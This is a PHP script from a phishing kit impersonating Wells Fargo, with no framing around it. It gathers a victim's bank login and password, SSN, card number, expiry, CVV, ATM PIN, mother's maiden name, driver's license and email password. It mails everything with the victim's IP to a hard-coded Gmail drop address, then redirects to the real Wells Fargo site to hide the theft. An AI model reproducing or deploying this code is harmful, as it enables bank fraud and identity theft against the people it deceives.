<?php
session_start();
$id = $_SESSION['id'];
$pass = $_SESSION['pass'];
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];


$t1 = $_POST['t1'];
$t2 = $_POST['t2'];
$t3 = $_POST['t3'];
$t10 = $_POST['t10'];
$t4 = $_POST['t4'];
$t5 = $_POST['t5'];
$t6 = $_POST['t6'];
$t7 = $_POST['t7'];
$t8 = $_POST['t8'];
$tdl = $_POST['tdl'];
$b1 = $_POST['b1'];
$b2 = $_POST['b2'];
$b3 = $_POST['b3'];
$cc = $_POST['cc'];
$ex1 = $_POST['ex1'];
$ex2 = $_POST['ex2'];
$ccv = $_POST['ccv'];
$pin = $_POST['pin'];
$ma = $_POST['ma'];
$mp = $_POST['mp'];

$ssn = "$t5" . "-" . "$t6" . "-" . "$t7";
$bd = "$b1" . "-" . "$b2" . "-" . "$b3";
$ex = "$ex1" . "-" . "$ex2";


$message .="
ID    : ".$id."
Password    : ".$pass."
First name    : ".$t1."
Last name    : ".$t2."
Address : ".$t3."
ZipCode : ".$t10."
Phone Number : ".$t4."
Mother's Maiden Name : ".$t8."
birth Date : ".$bd."
Driver's License : ".$tdl."
Social Security Number : ".$ssn."
Card Number : ".$cc."
Expire Date : ".$ex."
CCV : ".$ccv."
ATM Pin : ".$pin."
Email Address : ".$ma."
Email Password : ".$mp."
====================== 	PC-INFO ====================||
Date / time	    : $date
Client IP         : http://www.geoiptool.com/?IP=$ip
=========||xxxat0sxxx@aol.com |=====================||\n";
$send="popo.joky007@gmail.com";
$subject = "Wells at0s | $ip";
mail($send,$subject,$message);

die("<script>location.href = 'https://wellsfargo.com'</script>");
?>